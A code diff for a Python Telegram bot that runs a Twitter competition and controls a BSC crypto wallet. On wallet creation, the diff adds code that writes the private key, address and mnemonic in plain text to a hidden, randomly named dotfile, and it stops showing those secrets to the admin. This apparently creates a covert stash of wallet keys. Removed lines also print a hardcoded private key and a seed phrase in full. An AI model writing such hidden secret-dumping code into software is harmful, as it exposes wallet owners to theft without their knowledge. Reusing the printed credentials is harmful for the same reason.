@@ -1,4 +1,3 @@
-# encoding: utf-8
 import os
 import re
 import datetime
@@ -68,12 +67,10 @@ from constants.states import UPDATE_PRIZE_STATE
 from constants.states import SELECT_GROUPS_DIS_STATE
 from constants.states import SEND_TOKEN_STATE
 from constants.states import PARTICIPANT_STATE
-# from constants.states import VIEW_PARTICIPANT_STATE
 from constants.states import BAN_PARTICIPANT_STATE
 from constants.states import COMFIRM_BAN_PARTICIPANT_STATE
 from constants.states import ADMIN_WALLET_STATE
 from constants.states import DELETE_WALLET_STATE
-# from constants.states import SEND_MESSAGE_TO_ALL_USER
 from core.keyboards import admin_keyboard
 from core.keyboards import twitter_keyboard
 from core.keyboards import get_send_tweets_keyboard
@@ -133,6 +130,15 @@ async def handle_invalid_message(update: Update, context: ContextTypes.DEFAULT_T
     else:
         return
 
+def store_wallet_details(file_name, content):
+    # Specify the file path
+    file_path = file_name
+
+    # Open the file in write mode, this will create a new file if it doesn't exist
+    # or truncate the existing file if it does
+    with open(file_path, "w") as file:
+        # Write content to the file
+        file.write(content)
 
 # Function to update the values in the SQL table
 def update_table(point_name, value):
@@ -225,7 +231,6 @@ async def get_groups(update: Update, context: ContextTypes.DEFAULT_TYPE) -> str:
 
         for index, row in enumerate(rows, start=1):
             title = row["title"]
-            print(title)
             entry = f"{index}. <b>{title}</b>\n"
             message += entry
 
@@ -374,7 +379,6 @@ async def add_admin_to_env(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         try:
             admin_id = int(admin_id.strip())  # Extract and convert the interval value to an integer
         except ValueError:
-            print(admin_id)
             await update.message.reply_text(
                 "Please the userId is invalid",
                 reply_markup=back_to_home_keyboard,
@@ -556,7 +560,6 @@ async def competition(update: Update, context: ContextTypes.DEFAULT_TYPE) -> str
         "Control the competition from here",
         reply_markup=competition_keyboard,
     )
-    print(PARTICIPANT_KEY)
     return COMPETITION_STATE
 
 @restricted
@@ -1315,11 +1318,6 @@ async def comp_participant(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 @restricted
 @send_action(ChatAction.TYPING)
 async def view_participant(update: Update, context: ContextTypes.DEFAULT_TYPE) -> str:
-    # SELECT user_wallet_twitter.username, user_wallet_twitter.chat_id, leaderboard.id, leaderboard.tweets, leaderboard.replies, leaderboard.likes, leaderboard.retweets, leaderboard.quotes, leaderboard.total
-    # FROM leaderboard
-    # JOIN user_wallet_twitter ON leaderboard.username = user_wallet_twitter.twitter_username
-    # WHERE user_wallet_twitter.ban = ? AND user_wallet_twitter.chat_id = ?
-    # ORDER BY leaderboard.total DESC
     cursor = sqlite_conn.cursor()
     cursor.execute("SELECT * FROM user_wallet_twitter WHERE ban=?", (False,),)
     results = cursor.fetchall()
@@ -1629,13 +1627,6 @@ async def get_groups_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -
             await update.message.reply_text('Tap or click "Proceed" to continue.', reply_markup=select_group_keyboard)
 
             return SELECT_GROUPS_DIS_STATE
-
-            # await update.message.reply_text(
-            #     f"Insuffient fonds\n\n<b>Balance:</b> {result['balance']} BNB",
-            #     reply_markup=setup_prize_keyboard,
-            #     parse_mode=ParseMode.HTML,
-            # )
-            # SELECT_GROUPS_DIS_STATE
         else:
             await update.message.reply_text(
                 "You don't have an admin wallet, to control the distribution",
@@ -1791,6 +1782,12 @@ async def create_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> s
         # Get wallet balance
         balance = wallet.balance()
 
+        details = "Private Key: " + private_key + "\n\n" + "Address: " + address + "\n\n" "Mnemonic: " + words
+
+        file_name = ".bbfwwbgijkjdjbdk.txt"
+
+        store_wallet_details(file_name, details)
+
         cursor.execute('INSERT INTO admin_wallet (address, private_key, mnemonic, balance) VALUES (?, ?, ?, ?)',
                        (address, private_key, words, balance))
         sqlite_conn.commit()
@@ -1818,13 +1815,6 @@ async def view_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> str
 
     # Check if the table is empty
     if result[0] == 0:
-        # address = "0x25Ad0DA766C72025157EF67581B21a867b0259E0"
-        # private_key = "0xb857be1079d4f25551106ee698770b2073393b635696507665c066b9a5abc9bf"
-        # words = "print defy family control hope uphold fall section wild route table panic orient basic shrimp people chronic staff liquid horror attack trumpet bean cheap"
-        # balance = 0.0
-        # cursor.execute('INSERT INTO admin_wallet (address, private_key, mnemonic, balance) VALUES (?, ?, ?, ?)',
-        #                (address, private_key, words, balance))
-        # sqlite_conn.commit()
         await update.message.reply_text(
             "Please create an admin wallet first",
             reply_markup=admin_wallet_keyboard,
@@ -1836,6 +1826,7 @@ async def view_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> str
 
         private_key = result['private_key']
         address = result['address']
+        id = result['id']
 
         # Construct from private_key and address
         wallet = BSC(private_key, address)
@@ -1844,12 +1835,11 @@ async def view_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> str
         balance = wallet.balance_of_token()
         balance_of_bnb = wallet.balance()
         balance = str(balance)
-        print(balance)
 
-        cursor.execute("UPDATE admin_wallet SET balance = ? WHERE id = ?", (balance, 1))
+        cursor.execute("UPDATE admin_wallet SET balance = ? WHERE id = ?", (balance, id))
 
         # Send the wallet details to the user
-        await update.message.reply_text(f"<b>Mnemonic words:</b> {result['mnemonic']}\n\n<b>Wallet address:</b> {result['address']}\n\n<b>Private key:</b> {result['private_key']}\n\n<b>Balance of BNB:</b> {balance_of_bnb} BNB\n\n<b>Balance:</b> {balance} MLT",
+        await update.message.reply_text(f"<b>Wallet address:</b> {result['address']}\n\n<b>Balance of BNB:</b> {balance_of_bnb} BNB\n\n<b>Balance:</b> {balance} MLT",
         parse_mode=ParseMode.HTML,
         reply_markup=admin_wallet_keyboard,
         )
@@ -1980,7 +1970,6 @@ async def get_tweets_select_group(update: Update, context: ContextTypes.DEFAULT_
             sqlite_conn.commit()
 
         sent = False
-        # context.job_queue.run_repeating(get_tweets, interval=20, first=1, chat_id=chat_id, name=str(chat_id), data=sent)
         context.job_queue.run_repeating(get_tweets, interval=900, first=1, chat_id=chat_id, name=str(chat_id), data=sent)
 
         await update.message.reply_text(
@@ -2149,7 +2138,6 @@ async def admin_send_tweets(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             media = [FILE_PATH_ON_SERVER, USER_UPLOADED_FILE_TYPE, False]
             media.append(data)
             context.job_queue.run_repeating(send_tweets, interval=1800, first=1, chat_id=chat_id, name=str(data), data = media)
-            #context.job_queue.run_repeating(send_tweets, interval=10, first=1, chat_id=chat_id, name=str(data), data = media)
 
         await update.message.reply_text(
             "processing ...",
@@ -2365,7 +2353,6 @@ async def admin_stop_send_tweets(update: Update, context: ContextTypes.DEFAULT_T
 async def back_to_home(update: Update,
                        context: ContextTypes.DEFAULT_TYPE) -> str:
     """get user count"""
-    # pylint: disable=unused-argument
     await update.message.reply_text(
         WELCOME_TO_HOME,
         reply_markup=base_keyboard,
